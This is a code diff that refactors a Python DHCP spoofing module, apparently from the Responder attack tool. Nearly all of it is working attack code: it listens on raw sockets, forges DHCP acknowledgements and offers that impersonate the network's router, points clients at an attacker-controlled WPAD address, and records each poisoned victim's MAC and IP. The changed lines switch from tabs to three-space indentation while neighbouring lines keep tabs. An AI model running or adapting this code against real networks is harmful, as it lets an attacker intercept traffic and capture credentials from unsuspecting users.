@@ -50,12 +50,9 @@ class Packet():
 		("data", ""),
 	])
 	def __init__(self, **kw):
-		self.fields = OrderedDict(self.__class__.fields)
-		for k,v in kw.items():
-			if callable(v):
-				self.fields[k] = v(self.fields[k])
-			else:
-				self.fields[k] = v
+	   self.fields = OrderedDict(self.__class__.fields)
+	   for k,v in kw.items():
+	      self.fields[k] = v(self.fields[k]) if callable(v) else v
 	def __str__(self):
 		return "".join(map(str, self.fields.values()))
 
@@ -70,17 +67,17 @@ NETMASK             = "255.255.255.0"
 DNSIP               = "0.0.0.0"
 DNSIP2              = "0.0.0.0"
 DNSNAME             = "local"
-WPADSRV             = "http://"+Responder_IP+"/wpad.dat"
+WPADSRV = f"http://{Responder_IP}/wpad.dat"
 Respond_To_Requests = True
 DHCPClient          = []
 
 def GetMacAddress(Interface):
-	try:
-		mac = netifaces.ifaddresses(Interface)[netifaces.AF_LINK][0]['addr']
-		return binascii.unhexlify(mac.replace(':', '')).decode('latin-1')
-	except:
-		mac = "00:00:00:00:00:00"
-		return binascii.unhexlify(mac.replace(':', '')).decode('latin-1')
+   try:
+      mac = netifaces.ifaddresses(Interface)[netifaces.AF_LINK][0]['addr']
+      return binascii.unhexlify(mac.replace(':', '')).decode('latin-1')
+   except Exception:
+      mac = "00:00:00:00:00:00"
+      return binascii.unhexlify(mac.replace(':', '')).decode('latin-1')
 		
 ##### IP Header #####
 class IPHead(Packet):
@@ -223,86 +220,83 @@ def ParseSrcDSTAddr(data):
     return SrcIP, SrcPort, DstIP, DstPort
 
 def FindIP(data):
-    data = data.decode('latin-1')
-    IP = ''.join(re.findall(r'(?<=\x32\x04)[^EOF]*', data))
-    return ''.join(IP[0:4]).encode('latin-1')
+   data = data.decode('latin-1')
+   IP = ''.join(re.findall(r'(?<=\x32\x04)[^EOF]*', data))
+   return ''.join(IP[:4]).encode('latin-1')
 
 def ParseDHCPCode(data, ClientIP,DHCP_DNS):
-    global DHCPClient
-    global ROUTERIP
-    PTid        = data[4:8]
-    Seconds     = data[8:10]
-    CurrentIP   = socket.inet_ntoa(data[12:16])
-    RequestedIP = socket.inet_ntoa(data[16:20])
-    MacAddr     = data[28:34]
-    MacAddrStr  = ':'.join('%02x' % ord(m) for m in MacAddr.decode('latin-1')).upper()
-    OpCode      = data[242:243]
-    RequestIP   = data[245:249]
-    
-    if DHCPClient.count(MacAddrStr) >= 4:
-        return "'%s' has been poisoned more than 4 times. Ignoring..." % MacAddrStr
+   global DHCPClient
+   global ROUTERIP
+   PTid        = data[4:8]
+   Seconds     = data[8:10]
+   CurrentIP   = socket.inet_ntoa(data[12:16])
+   RequestedIP = socket.inet_ntoa(data[16:20])
+   MacAddr     = data[28:34]
+   MacAddrStr  = ':'.join('%02x' % ord(m) for m in MacAddr.decode('latin-1')).upper()
+   OpCode      = data[242:243]
+   RequestIP   = data[245:249]
 
-    if OpCode == b"\x02" and Respond_To_Requests:  # DHCP Offer
-        ROUTERIP = ClientIP
-        return 'Found DHCP server IP: %s, now waiting for incoming requests...' % (ROUTERIP)
+   if DHCPClient.count(MacAddrStr) >= 4:
+      return f"'{MacAddrStr}' has been poisoned more than 4 times. Ignoring..."
 
-    elif OpCode == b"\x03" and Respond_To_Requests:  # DHCP Request
-        IP = FindIP(data)
-        if IP:
-            IPConv = socket.inet_ntoa(IP)
-            if RespondToThisIP(IPConv):
-                IP_Header = IPHead(SrcIP = socket.inet_aton(ROUTERIP).decode('latin-1'), DstIP=IP.decode('latin-1'))
-                Packet = DHCPACK(Tid=PTid.decode('latin-1'), ClientMac=MacAddr.decode('latin-1'), GiveClientIP=IP.decode('latin-1'), ElapsedSec=Seconds.decode('latin-1'))
-                Packet.calculate(DHCP_DNS)
-                Buffer = UDP(Data = Packet)
-                Buffer.calculate()
-                SendDHCP(str(IP_Header)+str(Buffer), (IPConv, 68))
-                DHCPClient.append(MacAddrStr)
-                SaveDHCPToDb({
-                              'MAC': MacAddrStr, 
-                              'IP': CurrentIP, 
-                              'RequestedIP': IPConv,
-                             })
-                return 'Acknowledged DHCP Request for IP: %s, Req IP: %s, MAC: %s' % (CurrentIP, IPConv, MacAddrStr)
-                
-    # DHCP Inform
-    elif OpCode == b"\x08":
-        IP_Header = IPHead(SrcIP = socket.inet_aton(ROUTERIP).decode('latin-1'), DstIP=socket.inet_aton(CurrentIP).decode('latin-1'))
-        Packet = DHCPACK(Tid=PTid.decode('latin-1'), ClientMac=MacAddr.decode('latin-1'), ActualClientIP=socket.inet_aton(CurrentIP).decode('latin-1'),
-                                                        GiveClientIP=socket.inet_aton("0.0.0.0").decode('latin-1'),
-                                                        NextServerIP=socket.inet_aton("0.0.0.0").decode('latin-1'),
-                                                        RelayAgentIP=socket.inet_aton("0.0.0.0").decode('latin-1'),
-                                                        ElapsedSec=Seconds.decode('latin-1'))
-        Packet.calculate(DHCP_DNS)
-        Buffer = UDP(Data = Packet)
-        Buffer.calculate()
-        SendDHCP(str(IP_Header)+str(Buffer), (CurrentIP, 68))
-        DHCPClient.append(MacAddrStr)
-        SaveDHCPToDb({
-                      'MAC': MacAddrStr, 
-                      'IP': CurrentIP, 
-                      'RequestedIP': RequestedIP,
-                      })
-        return 'Acknowledged DHCP Inform for IP: %s, Req IP: %s, MAC: %s' % (CurrentIP, RequestedIP, MacAddrStr)
+   if OpCode == b"\x02" and Respond_To_Requests:  # DHCP Offer
+      ROUTERIP = ClientIP
+      return f'Found DHCP server IP: {ROUTERIP}, now waiting for incoming requests...'
 
-    elif OpCode == b"\x01" and Respond_To_Requests:  # DHCP Discover
-        IP = FindIP(data)
-        if IP:
-            IPConv = socket.inet_ntoa(IP)
-            if RespondToThisIP(IPConv):
-                IP_Header = IPHead(SrcIP = socket.inet_aton(ROUTERIP).decode('latin-1'), DstIP=IP.decode('latin-1'))
-                Packet = DHCPACK(Tid=PTid.decode('latin-1'), ClientMac=MacAddr.decode('latin-1'), GiveClientIP=IP.decode('latin-1'), DHCPOpCode="\x02", ElapsedSec=Seconds.decode('latin-1'))
-                Packet.calculate(DHCP_DNS)
-                Buffer = UDP(Data = Packet)
-                Buffer.calculate()
-                SendDHCP(str(IP_Header)+str(Buffer), (IPConv, 0))
-                DHCPClient.append(MacAddrStr)
-                SaveDHCPToDb({
-                              'MAC': MacAddrStr, 
-                              'IP': CurrentIP, 
-                              'RequestedIP': IPConv,
-                             })
-                return 'Acknowledged DHCP Discover for IP: %s, Req IP: %s, MAC: %s' % (CurrentIP, IPConv, MacAddrStr)
+   elif OpCode == b"\x03" and Respond_To_Requests:  # DHCP Request
+      if IP := FindIP(data):
+         IPConv = socket.inet_ntoa(IP)
+         if RespondToThisIP(IPConv):
+            IP_Header = IPHead(SrcIP = socket.inet_aton(ROUTERIP).decode('latin-1'), DstIP=IP.decode('latin-1'))
+            Packet = DHCPACK(Tid=PTid.decode('latin-1'), ClientMac=MacAddr.decode('latin-1'), GiveClientIP=IP.decode('latin-1'), ElapsedSec=Seconds.decode('latin-1'))
+            Packet.calculate(DHCP_DNS)
+            Buffer = UDP(Data = Packet)
+            Buffer.calculate()
+            SendDHCP(str(IP_Header)+str(Buffer), (IPConv, 68))
+            DHCPClient.append(MacAddrStr)
+            SaveDHCPToDb({
+                          'MAC': MacAddrStr, 
+                          'IP': CurrentIP, 
+                          'RequestedIP': IPConv,
+                         })
+            return f'Acknowledged DHCP Request for IP: {CurrentIP}, Req IP: {IPConv}, MAC: {MacAddrStr}'
+
+   elif OpCode == b"\x08":
+      IP_Header = IPHead(SrcIP = socket.inet_aton(ROUTERIP).decode('latin-1'), DstIP=socket.inet_aton(CurrentIP).decode('latin-1'))
+      Packet = DHCPACK(Tid=PTid.decode('latin-1'), ClientMac=MacAddr.decode('latin-1'), ActualClientIP=socket.inet_aton(CurrentIP).decode('latin-1'),
+                                                      GiveClientIP=socket.inet_aton("0.0.0.0").decode('latin-1'),
+                                                      NextServerIP=socket.inet_aton("0.0.0.0").decode('latin-1'),
+                                                      RelayAgentIP=socket.inet_aton("0.0.0.0").decode('latin-1'),
+                                                      ElapsedSec=Seconds.decode('latin-1'))
+      Packet.calculate(DHCP_DNS)
+      Buffer = UDP(Data = Packet)
+      Buffer.calculate()
+      SendDHCP(str(IP_Header)+str(Buffer), (CurrentIP, 68))
+      DHCPClient.append(MacAddrStr)
+      SaveDHCPToDb({
+                    'MAC': MacAddrStr, 
+                    'IP': CurrentIP, 
+                    'RequestedIP': RequestedIP,
+                    })
+      return f'Acknowledged DHCP Inform for IP: {CurrentIP}, Req IP: {RequestedIP}, MAC: {MacAddrStr}'
+
+   elif OpCode == b"\x01" and Respond_To_Requests:  # DHCP Discover
+      if IP := FindIP(data):
+         IPConv = socket.inet_ntoa(IP)
+         if RespondToThisIP(IPConv):
+            IP_Header = IPHead(SrcIP = socket.inet_aton(ROUTERIP).decode('latin-1'), DstIP=IP.decode('latin-1'))
+            Packet = DHCPACK(Tid=PTid.decode('latin-1'), ClientMac=MacAddr.decode('latin-1'), GiveClientIP=IP.decode('latin-1'), DHCPOpCode="\x02", ElapsedSec=Seconds.decode('latin-1'))
+            Packet.calculate(DHCP_DNS)
+            Buffer = UDP(Data = Packet)
+            Buffer.calculate()
+            SendDHCP(str(IP_Header)+str(Buffer), (IPConv, 0))
+            DHCPClient.append(MacAddrStr)
+            SaveDHCPToDb({
+                          'MAC': MacAddrStr, 
+                          'IP': CurrentIP, 
+                          'RequestedIP': IPConv,
+                         })
+            return f'Acknowledged DHCP Discover for IP: {CurrentIP}, Req IP: {IPConv}, MAC: {MacAddrStr}'
 
 def SendDiscover():
 	s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
@@ -320,15 +314,15 @@ def SendDHCP(packet,Host):
 	s.sendto(NetworkSendBufferPython2or3(packet), Host)
 
 def DHCP(DHCP_DNS):
-    s = socket.socket(socket.PF_PACKET, socket.SOCK_RAW)
-    s.bind((Interface, 0x0800))
-    SendDiscover()
-    while True:
-            data = s.recvfrom(65535)
-            if data[0][23:24] == b"\x11":# is udp?
-                SrcIP, SrcPort, DstIP, DstPort = ParseSrcDSTAddr(data)
-                if SrcPort == 67 or DstPort == 67:
-                    ClientIP = socket.inet_ntoa(data[0][26:30])
-                    ret = ParseDHCPCode(data[0][42:], ClientIP,DHCP_DNS)
-                    if ret and not settings.Config.Quiet_Mode:
-                        print(text("[*] [DHCP] %s" % ret))
+   s = socket.socket(socket.PF_PACKET, socket.SOCK_RAW)
+   s.bind((Interface, 0x0800))
+   SendDiscover()
+   while True:
+      data = s.recvfrom(65535)
+      if data[0][23:24] == b"\x11":# is udp?
+         SrcIP, SrcPort, DstIP, DstPort = ParseSrcDSTAddr(data)
+         if SrcPort == 67 or DstPort == 67:
+            ClientIP = socket.inet_ntoa(data[0][26:30])
+            ret = ParseDHCPCode(data[0][42:], ClientIP,DHCP_DNS)
+            if ret and not settings.Config.Quiet_Mode:
+               print(text(f"[*] [DHCP] {ret}"))
